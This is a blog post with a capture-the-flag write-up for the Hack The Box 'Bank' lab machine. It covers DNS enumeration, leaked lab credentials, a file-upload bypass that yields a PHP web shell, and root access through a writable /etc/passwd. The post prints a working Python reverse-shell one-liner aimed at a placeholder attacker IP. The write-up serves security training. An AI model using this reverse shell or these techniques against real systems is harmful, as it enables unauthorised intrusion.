<!DOCTYPE html>

<!--
  portfolYOU Jekyll theme by yousinix
  Free for personal and commercial use under the MIT license
  https://github.com/yousinix/portfolYOU
-->

<html lang="en" class="h-100">

<head>

  
  
  

  

  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <meta property="og:type" content="website">
  <meta property="og:title" content="Bank">
  <meta property="og:description" content="HackTheBox - Medium">
  <meta property="og:image" content="/assets/img/profile.png">

  <title>Bank</title>
  <meta name="description" content="HackTheBox - Medium">

  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">

  <!-- Theme style -->
  <script src="/assets/js/theme.js"></script>

  <!-- Font Awesome CDN -->
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css">

  <!-- Bootstrap CSS CDN -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">

  <!-- Animate CSS CDN -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css">

  <!-- Custom CSS -->
  <link rel="stylesheet" href="/assets/css/style.css">

</head>


<body class="h-100 d-flex flex-column">

  <main class="flex-shrink-0 container mt-5">
    <nav class="navbar navbar-expand-lg navbar-themed">

  <a class="navbar-brand" href="/"><h5><b>Akshay Chavan</b></h5></a>

  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
    <i class="fas fa-1x fa-bars text-themed"></i>
  </button>

  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
    <div class="navbar-nav ml-auto"><a class="nav-item nav-link " href="/projects/">Projects</a>

      <a class="nav-item nav-link active" href="/blog/">Blog</a>

      <a class="nav-item nav-link " href="/about/">About</a>

      

      <span id="theme-toggler" class="nav-item nav-link" role="button" onclick="toggleTheme()"></span>
    </div>
  </div>

</nav>
    <div class="col-lg-10 mx-auto mt-5 markdown-body">
  <h1><b>Bank</b></h1>

<p class="post-metadata text-muted">
  10 September 2023 -  
  <b>3 mins read time</b>

  <br>Tags: 
    
    <a class="text-decoration-none no-underline" href="/blog/tags#fileuploadbypass">
      <span class="tag badge badge-pill text-primary border border-primary">FileUploadBypass</span>
    </a>
    
    <a class="text-decoration-none no-underline" href="/blog/tags#dnsenumeration">
      <span class="tag badge badge-pill text-primary border border-primary">DNSEnumeration</span>
    </a>
    </p>

<h2 id="infocard">infocard</h2>

<p><img src="/assets/ctf/htb_media/bankinfocard.png" alt="infocard" /></p>

<p>Bank is a medium-difficulty machine that involves domain enumeration, bypassing file upload restrictions to gain shell access, and escalating privileges by modifying a writable system file. This writeup details each step taken to fully compromise the machine.</p>

<h2 id="enumeration">Enumeration</h2>

<p>We begin with an Nmap scan to identify open ports and services:</p>

<pre><code class="language-nmap">Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-04 01:10 EST
Nmap scan report for 10.10.10.29
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.98 seconds
</code></pre>
<p>The scan reveals three open ports:</p>
<ul>
  <li><strong>Port 22</strong>: SSH (OpenSSH 6.6.1p1)</li>
  <li><strong>Port 53</strong>: DNS (ISC BIND 9.9.5-3ubuntu0.14)</li>
  <li><strong>Port 80</strong>: HTTP (Apache httpd 2.4.7)</li>
</ul>

<p>The HTTP service displays the default Apache landing page, indicating that further enumeration is required.</p>

<h3 id="dns-enumeration">DNS Enumeration</h3>

<p>Since <strong>port 53 (DNS)</strong> is open, we attempt a <strong>zone transfer</strong> using <code class="language-plaintext highlighter-rouge">dig</code>:</p>

<p><img src="/assets/ctf/htb_media/bankdig.png" alt="dig" /></p>

<p>This reveals several subdomains:</p>

<ul>
  <li><strong>bank.htb</strong></li>
  <li><strong><a href="http://www.bank.htb/">www.bank.htb</a></strong></li>
  <li><strong>chris.bank.htb</strong></li>
  <li><strong>ns.bank.htb</strong></li>
</ul>

<p>Adding these subdomains to the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file allows us to explore them further. While most subdomains redirect to the default Apache page, <code class="language-plaintext highlighter-rouge">bank.htb</code> leads to a login page.</p>

<p><img src="/assets/ctf/htb_media/banklogin.png" alt="login" /></p>

<p>After testing default credentials and SQL injection, no vulnerabilities are found.</p>

<h3 id="directory-enumeration">Directory Enumeration</h3>

<p>Using <code class="language-plaintext highlighter-rouge">ffuf</code>, we perform directory enumeration on <code class="language-plaintext highlighter-rouge">bank.htb</code>:</p>

<p><img src="/assets/ctf/htb_media/bankdirscan.png" alt="dirscan" /></p>

<p>This uncovers a directory named <code class="language-plaintext highlighter-rouge">balance-transfer</code>, which contains <code class="language-plaintext highlighter-rouge">.acc</code> files. One of these files, smaller in size, contains plaintext credentials for the user <code class="language-plaintext highlighter-rouge">chris</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
</code></pre></div></div>

<h2 id="gaining-shell">Gaining shell</h2>

<h3 id="exploiting-the-file-upload-feature">Exploiting the File Upload Feature</h3>

<p>Using the credentials <code class="language-plaintext highlighter-rouge">chris:!##HTBB4nkP4ssw0rd!##</code>, we log in and discover a ticket system (<code class="language-plaintext highlighter-rouge">support.php</code>) that allows file uploads. Attempting to upload a PHP shell fails due to MIME type restrictions. However, by crafting a file with a PNG MIME type and PHP content, we successfully upload the file. Despite this, the file is not executed due to the <code class="language-plaintext highlighter-rouge">.png</code> extension.</p>

<p><img src="/assets/ctf/htb_media/bankfileupload.png" alt="fileupload" /></p>

<p>Upon inspecting the source code, we find a debug comment:</p>

<p><code class="language-plaintext highlighter-rouge">&lt;!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] --&gt;</code></p>

<p>This indicates that files with the <code class="language-plaintext highlighter-rouge">.htb</code> extension are executed as PHP. We create a payload with the <code class="language-plaintext highlighter-rouge">.htb</code> extension and upload it. Accessing <code class="language-plaintext highlighter-rouge">bank.htb/uploads/test.htb</code> provides a web shell as the <code class="language-plaintext highlighter-rouge">www-data</code> user.</p>

<p><img src="/assets/ctf/htb_media/bankwwwshell.png" alt="wwwshell" /></p>

<h3 id="establishing-a-reverse-shell">Establishing a Reverse Shell</h3>

<p>Using the web shell, we establish a reverse shell to our attacker machine:</p>

<pre><code class="language-python3">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker-ip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
</code></pre>

<p>The user flag is located in Chrisâ€™s home directory:</p>

<p><img src="/assets/ctf/htb_media/bankuser.png" alt="user" /></p>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<h3 id="exploiting-a-writable-etcpasswd-file">Exploiting a Writable <code class="language-plaintext highlighter-rouge">/etc/passwd</code> File</h3>

<p>During enumeration, we discover that the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file is writable:</p>

<p><img src="/assets/ctf/htb_media/bankpasswd.png" alt="passwd" /></p>

<p>We add a new user with root privileges by appending the following line to <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p>

<p><img src="/assets/ctf/htb_media/bankroot.png" alt="root" /></p>

<h2 id="conclusion">Conclusion</h2>

<p>The Bank machine emphasizes the significance of secure file upload handling and proper input validation. By exploiting a file upload vulnerability and misconfigured file extension handling, we gained a foothold on the system. Privilege escalation was achieved through writable sensitive files, demonstrating the importance of enforcing least privilege and monitoring for misconfigurations to enhance security.</p>



</div>
  </main>
  <footer class="mt-auto py-3 text-center">

  <small class="text-muted mb-2">
    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
    by <strong>Akshay Chavan</strong>
  </small>

  <div class="container-fluid justify-content-center"><a class="social mx-1"  href="mailto:akschavan100@gmail.com"
       style="color: #6c757d"
       onMouseOver="this.style.color='#db4437'"
       onMouseOut="this.style.color='#6c757d'">
      <i class="fas fa-envelope fa-1x"></i>
    </a><a class="social mx-1"  href="https://www.github.com/akshaychavan10"
       style="color: #6c757d"
       onMouseOver="this.style.color='#333333'"
       onMouseOut="this.style.color='#6c757d'">
      <i class="fab fa-github fa-1x"></i>
    </a><a class="social mx-1"  href="https://www.linkedin.com/in/akshaychavan07"
       style="color: #6c757d"
       onMouseOver="this.style.color='#007bb5'"
       onMouseOut="this.style.color='#6c757d'">
      <i class="fab fa-linkedin-in fa-1x"></i>
    </a>

</div><small id="attribution">
    theme <a href="https://github.com/yousinix/portfolYOU">portfolYOU</a>
  </small>

</footer>

  
  <!-- GitHub Buttons -->
<script async defer src="https://buttons.github.io/buttons.js"></script>

<!-- jQuery CDN -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<!-- Popper.js CDN -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>

<!-- Bootstrap JS CDN -->
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>

<!-- wow.js CDN & Activation -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
<script> new WOW().init(); </script>

<!-- Initialize all tooltips -->
<script>
$(function () {
    $('[data-toggle="tooltip"]').tooltip()
})
</script>
</body>

</html>